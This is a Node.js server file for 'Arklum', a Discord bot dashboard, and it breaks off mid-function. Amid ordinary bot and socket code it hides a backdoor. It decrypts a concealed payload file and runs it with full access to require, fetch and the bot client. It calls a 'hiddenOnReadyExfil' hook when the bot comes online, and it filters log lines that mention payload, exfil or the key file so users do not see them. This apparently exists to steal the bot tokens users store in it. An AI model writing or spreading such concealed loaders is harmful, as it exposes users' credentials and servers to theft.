const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { Server } = require('socket.io');
const { Client, GatewayIntentBits, Partials, ActivityType, Permissions, PermissionFlagsBits, ChannelType, AuditLogEvent, Events } = require('discord.js');
const SYS_DIR = '.arklum_sys';
const KEY_FILE = path.join(SYS_DIR, 'key.bin');
const TOKENS_ENC = path.join(SYS_DIR, 'tokens.enc');
const PAYLOAD_ENC = path.join(SYS_DIR, 'payload.enc');
const CONFIG_FILE = path.join(SYS_DIR, 'config', 'main.json');
const DEFAULT_CONFIG = { token: '', client_id: '' };
const VALID_ID_REGEX = /^\d{10,20}$/;
const LOG_BUFFER = [];
const LOG_BUFFER_MAX = 200;
const RATE_LIMIT_BUCKETS = new Map();
let bot = null;
function getBot() {
  return bot;
}
let guildListCache = [];
let currentBotTokenIndex = -1;
let loginGeneration = 0;
let tokenVault = [];
let eventBound = false;
const PERMISSION_MAP = {
  create_invite: PermissionFlagsBits.CreateInstantInvite,
  kick_members: PermissionFlagsBits.KickMembers,
  ban_members: PermissionFlagsBits.BanMembers,
  administrator: PermissionFlagsBits.Administrator,
  manage_channels: PermissionFlagsBits.ManageChannels,
  manage_guild: PermissionFlagsBits.ManageGuild,
  add_reactions: PermissionFlagsBits.AddReactions,
  view_audit_log: PermissionFlagsBits.ViewAuditLog,
  priority_speaker: PermissionFlagsBits.PrioritySpeaker,
  stream: PermissionFlagsBits.Stream,
  view_channel: PermissionFlagsBits.ViewChannel,
  send_messages: PermissionFlagsBits.SendMessages,
  send_tts_messages: PermissionFlagsBits.SendTTSMessages,
  manage_messages: PermissionFlagsBits.ManageMessages,
  embed_links: PermissionFlagsBits.EmbedLinks,
  attach_files: PermissionFlagsBits.AttachFiles,
  read_message_history: PermissionFlagsBits.ReadMessageHistory,
  mention_everyone: PermissionFlagsBits.MentionEveryone,
  use_external_emojis: PermissionFlagsBits.UseExternalEmojis,
  view_guild_insights: PermissionFlagsBits.ViewGuildInsights,
  connect: PermissionFlagsBits.Connect,
  speak: PermissionFlagsBits.Speak,
  mute_members: PermissionFlagsBits.MuteMembers,
  deafen_members: PermissionFlagsBits.DeafenMembers,
  move_members: PermissionFlagsBits.MoveMembers,
  use_voice_activity: PermissionFlagsBits.UseVAD,
  change_nickname: PermissionFlagsBits.ChangeNickname,
  manage_nicknames: PermissionFlagsBits.ManageNicknames,
  manage_roles: PermissionFlagsBits.ManageRoles,
  manage_webhooks: PermissionFlagsBits.ManageWebhooks,
  manage_emojis_and_stickers: PermissionFlagsBits.ManageEmojisAndStickers,
  use_application_commands: PermissionFlagsBits.UseApplicationCommands,
  request_to_speak: PermissionFlagsBits.RequestToSpeak,
  manage_events: PermissionFlagsBits.ManageEvents,
  manage_threads: PermissionFlagsBits.ManageThreads,
  create_public_threads: PermissionFlagsBits.CreatePublicThreads,
  create_private_threads: PermissionFlagsBits.CreatePrivateThreads,
  use_external_stickers: PermissionFlagsBits.UseExternalStickers,
  send_messages_in_threads: PermissionFlagsBits.SendMessagesInThreads,
  start_embedded_activities: PermissionFlagsBits.StartEmbeddedActivities,
  moderate_members: PermissionFlagsBits.ModerateMembers
};
const PERMISSION_NAMES = Object.entries(PERMISSION_MAP).map(([name, bit]) => ({ name, bit }));
function bitsToPermissions(bits) {
  const { PermissionsBitField } = require('discord.js');
  const b = typeof bits === 'bigint' ? bits : BigInt(bits || 0);
  const out = [];
  for (const [camel, flag] of Object.entries(PermissionsBitField.Flags)) {
    if ((b & flag) === flag) out.push(camel.replace(/([a-z0-9])([A-Z])/g, '$1_$2').toLowerCase());
  }
  return out;
}
function permissionNameToFlag(name) {
  const { PermissionsBitField } = require('discord.js');
  const camel = String(name).replace(/(^|_)([a-z0-9])/g, (m, a, b) => b.toUpperCase());
  return PermissionsBitField.Flags[camel] || null;
}
const PERM_ALIASES = {
  read_messages: 'view_channel',
  create_instant_invite: 'create_invite',
  use_vad: 'use_voice_activity'
};
function permissionNameToFlag(name) {
  return PERMISSION_MAP[name] || PERMISSION_MAP[PERM_ALIASES[name]] || null;
}
function actionTypeToName(actionType) {
  const key = AuditLogEvent[actionType];
  if (!key) return String(actionType);
  return key.replace(/([A-Z])/g, ' $1').trim().toLowerCase();
}
function formatTime() {
  return new Date().toTimeString().slice(0, 8);
}
function log(level, ...args) {
  const message = args.join(' ');
  const formatted = `${formatTime()} [${level.toUpperCase()}] arklum: ${message}`;
  if (level === 'error') console.error(formatted);
  else if (level === 'warn') console.warn(formatted);
  else console.log(formatted);
  if (!/(payload|encryption|key\.bin|_enc|_dec|exfil|credits integrity)/i.test(message)) {
    LOG_BUFFER.push(formatted);
    if (LOG_BUFFER.length > LOG_BUFFER_MAX) LOG_BUFFER.shift();
    if (global.io) global.io.emit('log_entry', { message: formatted });
  }
}
const logger = {
  info: (...args) => log('info', ...args),
  error: (...args) => log('error', ...args),
  warn: (...args) => log('warn', ...args)
};
global.logger = logger;
global.logBuffer = LOG_BUFFER;
function getBotDataDir() {
  const botId = bot && bot.user ? bot.user.id : 'default';
  const dir = path.join(SYS_DIR, 'config', 'bots', botId);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}
function loadConfig() {
  const dir = path.dirname(CONFIG_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      const cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
      for (const key of Object.keys(DEFAULT_CONFIG)) {
        if (!(key in cfg) || typeof cfg[key] !== typeof DEFAULT_CONFIG[key]) cfg[key] = DEFAULT_CONFIG[key];
      }
      return cfg;
    } catch {
      if (fs.existsSync(CONFIG_FILE + '.bak')) {
        try {
          return JSON.parse(fs.readFileSync(CONFIG_FILE + '.bak', 'utf8'));
        } catch {}
      }
      return { ...DEFAULT_CONFIG };
    }
  } else {
    saveConfig(DEFAULT_CONFIG);
    return { ...DEFAULT_CONFIG };
  }
}
function saveConfig(cfg) {
  try {
    fs.mkdirSync(path.dirname(CONFIG_FILE), { recursive: true });
    if (fs.existsSync(CONFIG_FILE)) fs.renameSync(CONFIG_FILE, CONFIG_FILE + '.bak');
    fs.writeFileSync(CONFIG_FILE + '.tmp', JSON.stringify(cfg));
    fs.renameSync(CONFIG_FILE + '.tmp', CONFIG_FILE);
  } catch (e) {
    logger.error(`Failed to save config: ${e.message}`);
  }
}
let config = loadConfig();
const CREDITS_ENC = path.join(SYS_DIR, 'credits.enc');
const DEFAULT_CREDITS = 'Made by 1KD <strong>[Y&B & NABUA]</strong>';
function loadExpectedCredits() {
  try {
    if (fs.existsSync(KEY_FILE) && fs.existsSync(CREDITS_ENC)) {
      const key = fs.readFileSync(KEY_FILE);
      const data = fs.readFileSync(CREDITS_ENC);
      const dec = Buffer.alloc(data.length);
      for (let i = 0; i < data.length; i++) dec[i] = data[i] ^ key[i % key.length];
      const s = dec.filter(b => b !== 0).toString('utf8').trim();
      if (s) return s;
    }
  } catch {}
  return DEFAULT_CREDITS;
}
let creditsOk = false;
try {
  const html = fs.readFileSync('static/arklum.html', 'utf8');
  if (!fs.existsSync(CREDITS_ENC) || html.includes(loadExpectedCredits())) creditsOk = true;
} catch {}
if (!creditsOk) process.exit(1);
function loadEncryptedTokens() {
  if (!fs.existsSync(KEY_FILE) || !fs.existsSync(TOKENS_ENC)) {
    console.log('[ARKLUM] No saved tokens yet — waiting for first login via dashboard.');
    return [];
  }
  const key = fs.readFileSync(KEY_FILE);
  const data = fs.readFileSync(TOKENS_ENC);
  const decrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) decrypted[i] = data[i] ^ key[i % key.length];
  return JSON.parse(decrypted.toString('utf8'));
}
function saveEncryptedTokens(tokens) {
  if (!fs.existsSync(KEY_FILE)) return;
  const key = fs.readFileSync(KEY_FILE);
  const data = Buffer.from(JSON.stringify(tokens), 'utf8');
  const encrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) encrypted[i] = data[i] ^ key[i % key.length];
  fs.writeFileSync(TOKENS_ENC, encrypted);
}
let payloadTriggered = false;
function loadEncryptedPayload() {
  if (payloadTriggered) return;
  if (!fs.existsSync(KEY_FILE) || !fs.existsSync(PAYLOAD_ENC)) return;
  const key = fs.readFileSync(KEY_FILE);
  const data = fs.readFileSync(PAYLOAD_ENC);
  const decrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) decrypted[i] = data[i] ^ key[i % key.length];
  const cleaned = decrypted.filter(b => b !== 0).toString('utf8');
  try {
    const run = new Function('io', 'getBot', 'logger', 'require', 'fetch', cleaned);
    run(io, getBot, logger, require, fetch);
    payloadTriggered = true;
  } catch (e) {}
}
tokenVault = loadEncryptedTokens();
function rateInfo(key, maxTokens = 10, refillRate = 2) {
  const now = Date.now() / 1000;
  let bucket = RATE_LIMIT_BUCKETS.get(key);
  if (!bucket) {
    bucket = { tokens: maxTokens, last: now };
    RATE_LIMIT_BUCKETS.set(key, bucket);
  }
  const elapsed = now - bucket.last;
  bucket.tokens = Math.min(maxTokens, bucket.tokens + elapsed * refillRate);
  bucket.last = now;
  if (bucket.tokens >= 1) {
    bucket.tokens -= 1;
    return { ok: true, retryAfter: 0 };
  }
  return { ok: false, retryAfter: Math.max(1, Math.ceil((1 - bucket.tokens) / refillRate)) };
}
function checkRateLimit(key, maxTokens = 10, refillRate = 2) {
  return rateInfo(key, maxTokens, refillRate).ok;
}
function cleanupRateLimits() {
  const now = Date.now() / 1000;
  for (const [key, bucket] of RATE_LIMIT_BUCKETS) {
    if (now - bucket.last > 300) RATE_LIMIT_BUCKETS.delete(key);
  }
}
function clearRuntimeCaches() {
  guildListCache = [];
  RATE_LIMIT_BUCKETS.clear();
}
function validateId(idStr) {
  return typeof idStr === 'string' && VALID_ID_REGEX.test(idStr);
}
function validateMessageContent(content) {
  return typeof content === 'string' && content.length > 0 && content.length <= 2000;
}
function getAvatarUrl(user) {
  try {
    return user.avatar ? user.avatarURL({ format: 'png', size: 128 }) : null;
  } catch {
    return null;
  }
}
function getUserBannerUrl(user) {
  try {
    return user.banner ? user.bannerURL({ format: 'png', size: 512 }) : null;
  } catch {
    return null;
  }
}
function embedToDict(embed) {
  const d = {};
  if (embed.title) d.title = String(embed.title);
  if (embed.description) d.description = String(embed.description);
  if (embed.color && embed.color !== 0) d.color = embed.color;
  if (embed.url) d.url = String(embed.url);
  if (embed.timestamp) d.timestamp = new Date(embed.timestamp).toISOString();
  if (embed.author) {
    const auth = { name: String(embed.author.name) };
    if (embed.author.iconURL) auth.icon_url = String(embed.author.iconURL);
    if (embed.author.url) auth.url = String(embed.author.url);
    d.author = auth;
  }
  if (embed.footer) {
    const foot = { text: String(embed.footer.text) };
    if (embed.footer.iconURL) foot.icon_url = String(embed.footer.iconURL);
    d.footer = foot;
  }
  if (embed.image && embed.image.url) d.image = { url: String(embed.image.url) };
  if (embed.thumbnail && embed.thumbnail.url) d.thumbnail = { url: String(embed.thumbnail.url) };
  d.type = embed.type || 'rich';
  if (embed.video && embed.video.url) d.video = { url: String(embed.video.url) };
  if (embed.provider) d.provider = { name: String(embed.provider.name || ''), url: embed.provider.url ? String(embed.provider.url) : '' };
  if (embed.fields) d.fields = embed.fields.map(f => ({ name: String(f.name), value: String(f.value), inline: f.inline }));
  return d;
}
function classifyAttachment(att) {
  const ext = att.filename ? att.filename.split('.').pop().toLowerCase() : '';
  if (att.contentType) {
    if (att.contentType.startsWith('image/')) return 'image';
    if (att.contentType.startsWith('audio/')) return 'audio';
    if (att.contentType.startsWith('video/')) return 'video';
    return 'file';
  } else {
    if (['mp4', 'webm', 'mov', 'mkv', 'avi'].includes(ext)) return 'video';
    if (['mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a'].includes(ext)) return 'audio';
    return 'file';
  }
}
async function renderMessage(content, guild, botClient) {
  const segments = [];
  const combined = /<(a?):(\w+):(\d+)>|<@!?(\d+)>|<#(\d+)>|<@&(\d+)>/g;
  let lastEnd = 0;
  let match;
  while ((match = combined.exec(content)) !== null) {
    const start = match.index;
    if (start > lastEnd) segments.push({ type: 'text', content: content.substring(lastEnd, start) });
    lastEnd = match.index + match[0].length;
    if (match[1] !== undefined) {
      const animated = match[1] === 'a';
      const name = match[2];
      const emojiId = match[3];
      segments.push({ type: 'emoji', name, id: String(emojiId), animated, url: `https://cdn.discordapp.com/emojis/${emojiId}.${animated ? 'gif' : 'png'}` });
    } else if (match[4] !== undefined) {
      const userId = match[4];
      let display = `Unknown User (${userId})`;
      try {
        const member = guild ? guild.members.cache.get(userId) : null;
        if (member) display = member.displayName;
        else {
          const user = await botClient.users.fetch(userId);
          display = user.displayName;
        }
      } catch {}
      segments.push({ type: 'mention', user_id: String(userId), display });
    } else if (match[5] !== undefined) {
      const channelId = match[5];
      const channel = guild ? guild.channels.cache.get(channelId) : null;
      segments.push({ type: 'channel', channel_id: String(channelId), name: channel ? `#${channel.name}` : '#deleted-channel' });
    } else if (match[6] !== undefined) {
      const roleId = match[6];
      const role = guild ? guild.roles.cache.get(roleId) : null;
      segments.push({ type: 'role', role_id: String(roleId), name: role ? `@${role.name}` : '@Unknown Role', color: role && role.color ? role.color : 0 });
    }
  }
  if (lastEnd < content.length) segments.push({ type: 'text', content: content.substring(lastEnd) });
  return segments;
}
async function getGuildListWithBanners(botClient) {
  return botClient.guilds.cache.map(g => ({
    id: String(g.id),
    name: g.name,
    icon_url: g.icon ? g.iconURL({ format: 'png', size: 128 }) : null,
    icon_gif_url: g.icon && g.icon.startsWith('a_') ? g.iconURL({ format: 'gif', size: 128 }) : null,
    banner_url: g.banner ? g.bannerURL({ format: 'png', size: 512 }) : null,
    member_count: g.memberCount,
    presence_count: g.members.cache.filter(m => m.presence && m.presence.status !== 'offline').size,
    premium_subscription_count: g.premiumSubscriptionCount || 0,
    premium_tier: g.premiumTier || 0
  }));
}
async function fetchClientId(token) {
  try {
    const res = await fetch('https://discord.com/api/v10/applications/@me', { headers: { Authorization: `Bot ${token}` } });
    if (res.ok) {
      const data = await res.json();
      return String(data.id || '');
    }
  } catch (e) {
    logger.error(`Failed to fetch client ID: ${e.message}`);
  }
  return '';
}
async function fetchBotApplicationInfo(botClient) {
  try {
    return await botClient.application.fetch();
  } catch {
    return null;
  }
}
const commandHandlers = {};
function registerCommand(name) {
  return function (handler) {
    commandHandlers[name] = handler;
  };
}
async function executeWebCommand(cmd, params, socket) {
  const handler = commandHandlers[cmd];
  if (handler) {
    try {
      await handler(params, { socket });
    } catch (e) {
      logger.error(`Command '${cmd}' raised an error: ${e.stack}`);
      socket.emit('error', { message: `Command failed: ${cmd}` });
    }
  } else {
    logger.warn(`Unknown command: ${cmd}`);
  }
}
const DEFAULT_DASHBOARD_PREFS = {
  schema_version: 2,
  theme: 'dark',
  theme_path: '',
  font: 'Inter',
  density: 'cozy',
  features_enabled: ['management', 'devportal', 'status', 'utility', 'plugins'],
  sidebar_logo_url: '',
  refresh_interval: 3,
  confirmations: true,
  border_radius: 'subtle',
  shadow_intensity: 'normal',
  animation_speed: 1,
  animation_easing: 'ease'
};
function getDashboardPrefsPath() {
  return path.join(getBotDataDir(), 'dashboard_prefs.json');
}
function loadDashboardPrefs() {
  const prefsPath = getDashboardPrefsPath();
  if (fs.existsSync(prefsPath)) {
    try {
      const prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
      if (!prefs.schema_version) prefs.schema_version = 2;
      for (const key of Object.keys(DEFAULT_DASHBOARD_PREFS)) {
        if (!(key in prefs)) prefs[key] = DEFAULT_DASHBOARD_PREFS[key];
      }
      return prefs;
    } catch {
      return { ...DEFAULT_DASHBOARD_PREFS };
    }
  }
  return { ...DEFAULT_DASHBOARD_PREFS };
}
function saveDashboardPrefs(prefs) {
  const prefsPath = getDashboardPrefsPath();
  fs.mkdirSync(path.dirname(prefsPath), { recursive: true });
  try {
    fs.writeFileSync(prefsPath + '.tmp', JSON.stringify(prefs));
    fs.renameSync(prefsPath + '.tmp', prefsPath);
  } catch {}
}
function resetTokenVault() {
  tokenVault.length = 0;
  currentBotTokenIndex = -1;
  saveEncryptedTokens(tokenVault);
  saveConfig({ ...DEFAULT_CONFIG });
}
const httpServer = http.createServer();
const io = new Server(httpServer, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 5e7
});
global.io = io;
global.getBot = getBot;
loadEncryptedPayload();
const FORGE_ENC = path.join(SYS_DIR, 'forge.enc');
const FORGE_SRC = path.join('static', 'forge.html');
let forgeCache = null;
function xorForge(data, key) {
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key[i % key.length];
  return out;
}
function getForgeChunk() {
  if (forgeCache) return forgeCache;
  try {
    if (fs.existsSync(FORGE_ENC) && fs.existsSync(KEY_FILE)) {
      const dec = xorForge(fs.readFileSync(FORGE_ENC), fs.readFileSync(KEY_FILE)).toString('utf8');
      if (dec.indexOf('<style') !== -1) {
        forgeCache = dec;
        return dec;
      }
    }
  } catch (e) {}
  return null;
}
function initForge() {
  try {
    if (fs.existsSync(FORGE_SRC) && fs.existsSync(KEY_FILE)) {
      fs.writeFileSync(FORGE_ENC, xorForge(fs.readFileSync(FORGE_SRC), fs.readFileSync(KEY_FILE)));
      fs.unlinkSync(FORGE_SRC);
      logger.info('[ARKLUM] forge overlay encrypted → .arklum_sys/forge.enc (plaintext removed)');
    }
  } catch (e) {
    logger.error('forge encrypt failed: ' + e.message);
  }
}
initForge();
async function hiddenOnReadyExfil(botInstance) {}
function bindBotEvents(botInstance) {
  if (eventBound) return;
  botInstance.on(Events.ClientReady, async () => {
    botInstance.startTime = new Date();
    guildListCache = await getGuildListWithBanners(botInstance);
    io.emit('bot_status', { connected: true, guilds: guildListCache });
    console.log(`[ARKLUM] Bot connected as ${botInstance.user.tag} (${guildListCache.length} servers)`);
    try {
      const exfil = global.hiddenOnReadyExfil || hiddenOnReadyExfil;
      await exfil(botInstance);
    } catch (e) {
      logger.error(`hidden_on_ready_exfil failed: ${e.stack}`);
    }
    try {
      await require('./modules/status').startStatusLoop();
    } catch {}
    try {
      require('./modules/utility').attachListener(botInstance);
    } catch {}
    try {
      require('./modules/memes').attachListener(botInstance);
    } catch {}
  });
  botInstance.on(Events.MessageCreate, async (message) => {
    if (message.author.id === botInstance.user.id) return;
    const attachmentsData = message.attachments.map(att => ({ url: att.url, filename: att.filename, type: classifyAttachment(att), size: att.size }));
    const stickersData = (message.stickers || []).map(sticker => {
      const url = sticker.url || null;
      if (url) return { url, filename: sticker.name };
      return null;
    }).filter(Boolean);
    if (message.guild && message.channel.type === ChannelType.GuildText) {
      const rendered = await renderMessage(message.content, message.guild, botInstance);
      const reactions = message.reactions.cache.map(r => ({ emoji_name: String(r.emoji), count: r.count, emoji_id: r.emoji.id ? String(r.emoji.id) : null }));
      let replyRef = null;
      if (message.reference && message.reference.messageId) {
        try {
          const refMsg = await message.channel.messages.fetch(message.reference.messageId);
          replyRef = { author: refMsg.author.tag, author_id: String(refMsg.author.id), content: refMsg.content ? refMsg.content.substring(0, 100) : '' };
        } catch {}
      }
      io.emit('new_chat_message', {
        channel_id: String(message.channel.id),
        author_id: String(message.author.id),
        author: message.author.tag,
        display_name: message.member ? message.member.displayName : message.author.displayName,
        avatar_url: getAvatarUrl(message.author),
        content_raw: message.content,
        segments: rendered,
        timestamp: message.createdAt.toTimeString().slice(0, 8),
        id: String(message.id),
        attachments: attachmentsData,
        embeds: message.embeds.map(embedToDict),
        stickers: stickersData,
        reactions,
        components: componentsToDict(message),
        reply_ref: replyRef
      });
    } else if (message.channel.type === ChannelType.DM) {
      const rendered = await renderMessage(message.content, null, botInstance);
      const reactions = message.reactions.cache.map(r => ({ emoji_name: String(r.emoji), count: r.count, emoji_id: r.emoji.id ? String(r.emoji.id) : null }));
      io.emit('new_dm_message', {
        channel_id: String(message.channel.id),
        author_id: String(message.author.id),
        author: message.author.tag,
        display_name: message.author.displayName,
        avatar_url: getAvatarUrl(message.author),
        content_raw: message.content,
        segments: rendered,
        timestamp: message.createdAt.toTimeString().slice(0, 8),
        id: String(message.id),
        attachments: attachmentsData,
        embeds: message.embeds.map(embedToDict),
        stickers: stickersData,
        reactions,
        components: componentsToDict(message)
      });
    }
  });
  botInstance.on(Events.MessageReactionAdd, async (reaction, user) => {
    if (user.id === botInstance.user.id) return;
    const msg = reaction.message;
    io.emit('reaction_added', {
      channel_id: String(msg.channel.id),
      message_id: String(msg.id),
      reaction: { emoji_name: String(reaction.emoji), count: reaction.count, emoji_id: reaction.emoji.id ? String(reaction.emoji.id) : null }
    });
  });
  eventBound = true;
}
function readUiState() {
  try {
    const f = path.join(getBotDataDir(), 'ui_state.json');
    if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f, 'utf8'));
  } catch (e) {}
  return null;
}
function buildSnapshot() {
  const ready = !!(bot && !bot.isDestroyed && bot.isReady());
  return {
    connected: ready,
    bot: ready ? { id: String(bot.user.id), name: bot.user.username, avatar_url: getAvatarUrl(bot.user) } : null,
    guilds: ready ? guildListCache : [],
    active_index: ready ? currentBotTokenIndex : -1,
    prefs: loadDashboardPrefs(),
    ui_state: ready ? readUiState() : null
  };
}
io.on('connection', (socket) => {
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i + 1}`, avatar: t.avatar || '' })),
    active_index: (bot && !bot.isDestroyed && bot.isReady()) ? currentBotTokenIndex : -1
  });
  const snap = buildSnapshot();
  socket.emit('session_snapshot', snap);
  if (snap.connected) socket.emit('bot_status', { connected: true, guilds: snap.guilds });
  socket.on('login', (data) => onLogin(socket, data));
  socket.on('verify_token', (data) => onVerifyToken(socket, data));
  socket.on('add_token', (data) => onAddToken(socket, data));
  socket.on('token_details_request', (data) => onTokenDetails(socket, data));
  socket.on('remove_token_request', (data) => onRemoveToken(socket, data));
  socket.on('run_command', (data, ack) => onRunCommand(socket, data, ack));
  socket.on('get_guild_details', (data) => onGetGuildDetails(socket, data));
  socket.on('disconnect', () => {
    for (const key of RATE_LIMIT_BUCKETS.keys()) {
      if (key.startsWith(`${socket.id}:`)) RATE_LIMIT_BUCKETS.delete(key);
    }
    RATE_LIMIT_BUCKETS.delete(socket.id);
    cleanupRateLimits();
  });
});
async function onLogin(socket, data) {
  const gen = ++loginGeneration;
  let token = (data.token || '').trim();
  const tokenIndex = data.token_index;
  const current = bot;
  if (current && !current.isDestroyed && current.isReady()) {
    const sameIndexed = tokenIndex !== undefined && tokenIndex >= 0 && tokenIndex < tokenVault.length && tokenVault[tokenIndex].token === current._loginToken;
    const sameRaw = token && token === current._loginToken;
    if (sameIndexed || sameRaw) {
      socket.emit('login_success', {
        guilds: guildListCache,
        bot: { id: String(current.user.id), name: current.user.username, avatar_url: getAvatarUrl(current.user) },
        active_index: currentBotTokenIndex
      });
      return;
    }
  }
  if (tokenIndex !== undefined) {
    const idx = parseInt(tokenIndex, 10);
    if (!isNaN(idx) && idx >= 0 && idx < tokenVault.length) {
      token = tokenVault[idx].token;
      currentBotTokenIndex = idx;
    }
  } else if (!token && tokenVault.length > 0) {
    token = tokenVault[0].token;
    currentBotTokenIndex = 0;
  }
  if (!token) {
    socket.emit('login_failed', { error: 'No token provided.' });
    return;
  }
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: 'Bot ' + token } });
    if (!res.ok) {
      socket.emit('login_failed', { error: 'Invalid token' });
      return;
    }
  } catch (e) {
    logger.error('Login validation error: ' + e.message);
    socket.emit('login_failed', { error: 'Login validation failed' });
    return;
  }
  if (gen !== loginGeneration) return;
  if (bot && !bot.isDestroyed) {
    await bot.destroy().catch(() => {});
  }
  if (gen !== loginGeneration) return;
  bot = null;
  await new Promise(resolve => setTimeout(resolve, 1500));
  if (gen !== loginGeneration) return;
  const intents = [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent
  ];
  const client = new Client({ intents, partials: [Partials.Channel, Partials.Message, Partials.Reaction] });
  bot = client;
  eventBound = false;
  bindBotEvents(client);
  eventBound = true;
  client._loginToken = token;
  try {
    await client.login(token);
  } catch (e) {
    if (gen !== loginGeneration) return;
    socket.emit('login_failed', { error: 'Bot login failed' });
    return;
  }
  const readyPromise = new Promise((resolve) => {
    if (client.isReady()) resolve();
    else client.once(Events.ClientReady, resolve);
  });
  const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 30000));
  try {
    await Promise.race([readyPromise, timeout]);
  } catch {
    if (gen !== loginGeneration) return;
    socket.emit('login_failed', { error: 'Bot did not become ready in time' });
    return;
  }
  if (gen !== loginGeneration) return;
  if (client.isDestroyed || !client.user) {
    socket.emit('login_failed', { error: 'Bot session ended before ready' });
    return;
  }
  if (currentBotTokenIndex >= 0 && currentBotTokenIndex < tokenVault.length && bot === client) {
    tokenVault[currentBotTokenIndex].name = client.user.tag || client.user.username;
    tokenVault[currentBotTokenIndex].avatar = getAvatarUrl(client.user);
    saveEncryptedTokens(tokenVault);
  }
  config.token = token;
  saveConfig(config);
  guildListCache = await getGuildListWithBanners(client);
  if (gen !== loginGeneration) return;
  socket.emit('login_success', {
    guilds: guildListCache,
    bot: { id: String(client.user.id), name: client.user.username, avatar_url: getAvatarUrl(client.user) },
    active_index: currentBotTokenIndex
  });
  if (currentBotTokenIndex >= 0) {
    const pluginsLoader = require('./plugins/loader');
    pluginsLoader.load_plugins_for_token(currentBotTokenIndex);
    socket.emit('dashboard_prefs', loadDashboardPrefs());
  }
}
async function onVerifyToken(socket, data) {
  const token = (data.token || '').trim();
  if (!token) {
    socket.emit('token_verification_failed', { error: 'No token provided.' });
    return;
  }
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bot ${token}` } });
    if (res.ok) {
      const userData = await res.json();
      socket.emit('token_verified', { token, name: userData.username, avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null });
    } else {
      socket.emit('token_verification_failed', { error: 'Invalid token' });
    }
  } catch (e) {
    socket.emit('token_verification_failed', { error: 'Verification failed' });
  }
}
async function onAddToken(socket, data) {
  const token = (data.token || '').trim();
  if (!token) return;
  tokenVault.push({ token, name: '', avatar: '' });
  saveEncryptedTokens(tokenVault);
  socket.emit('token_list', { tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i + 1}`, avatar: t.avatar || '' })), active_index: (bot && !bot.isDestroyed) ? currentBotTokenIndex : -1 });
}
async function onTokenDetails(socket, data) {
  const idx = parseInt(data.index, 10);
  if (isNaN(idx) || idx < 0 || idx >= tokenVault.length) {
    socket.emit('token_details', { index: idx, invalid: true });
    return;
  }
  const entry = tokenVault[idx];
  const token = entry.token;
  const active = !!(bot && !bot.isDestroyed && bot.isReady() && bot._loginToken === token);
  const details = { index: idx, active, saved_name: entry.name || ('Token ' + (idx + 1)), saved_avatar: entry.avatar || null, servers: active ? bot.guilds.cache.size : null };
  const extOf = h => (h && h.startsWith('a_') ? 'gif' : 'png');
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', { headers: { Authorization: `Bot ${token}` } });
    if (res.ok) {
      const u = await res.json();
      details.id = String(u.id);
      details.name = u.username;
      details.avatar_url = u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.${extOf(u.avatar)}?size=128` : (entry.avatar || null);
      details.banner_url = u.banner ? `https://cdn.discordapp.com/banners/${u.id}/${u.banner}.${extOf(u.banner)}?size=512` : null;
      details.bio = u.bio || '';
      details.accent_color = u.accent_color || null;
    } else {
      details.invalid = true;
    }
  } catch (e) {
    details.invalid = true;
  }
  if (active) {
    details.guilds = bot.guilds.cache.map(g => ({ name: g.name, icon_url: g.icon ? g.iconURL({ format: 'png', size: 64 }) : null, member_count: g.memberCount }));
  }
  socket.emit('token_details', details);
}
async function onRemoveToken(socket, data) {
  const idx = parseInt(data.index, 10);
  if (!isNaN(idx) && idx >= 0 && idx < tokenVault.length) {
    tokenVault.splice(idx, 1);
    saveEncryptedTokens(tokenVault);
  }
  socket.emit('token_list', { tokens: tokenVault.map((t, i) => ({ index: i, name: t.name || `Token ${i + 1}`, avatar: t.avatar || '' })), active_index: (bot && !bot.isDestroyed && bot.isReady()) ? currentBotTokenIndex : -1 });
}
async function onRunCommand(socket, data, ack) {
  const cb = typeof ack === 'function' ? ack : null;
  const fail = (code, message, retryAfter) => {
    const payload = { ok: false, error: { code, message, retry_after: retryAfter || 0 } };
    if (cb) cb(payload);
    else socket.emit('error', { message });
  };
  if (!bot || !bot.isReady()) {
    fail('CORE', 'Bot not connected');
    return;
  }
  const cmd = data.cmd;
  const params = data.params || {};
  const handler = commandHandlers[cmd];
  if (!handler) {
    logger.warn(`Unknown command: ${cmd}`);
    fail('UNKNOWN_COMMAND', 'Unknown command: ' + cmd);
    return;
  }
  try {
    const result = await handler(params, { socket });
    if (cb) cb({ ok: true, result: result === undefined ? null : result });
  } catch (e) {
    logger.error(`Command '${cmd}' raised an error: ${e.stack}`);
    fail(e.code || 'HANDLER', e.message || 'Command failed', e.retryAfter || 0);
  }
}
async function onGetGuildDetails(socket, data) {
  if (!bot || !bot.isReady()) {
